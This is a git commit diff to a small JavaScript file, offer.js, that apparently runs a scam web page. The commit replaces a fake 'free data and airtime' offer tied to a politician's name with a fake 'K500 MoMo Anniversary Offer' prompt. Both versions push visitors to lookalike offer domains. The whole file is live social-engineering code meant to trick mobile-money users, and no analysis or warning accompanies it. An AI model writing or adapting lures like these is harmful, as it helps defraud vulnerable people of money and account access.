e38b0e878fb5d1668affd7b64fc7264dfeee1dd9
essac5523me <essac5523+me@gmail.com>
2025-04-23 12:59:39 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Claim K500'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive k500 MoMo Anniversary Offer, Kindly Press OK to PROCEED ','Claim K500');
+if (password != 'Claim K500') {
+location.href='https://momo-zm.offernow.lat/gift';
 }
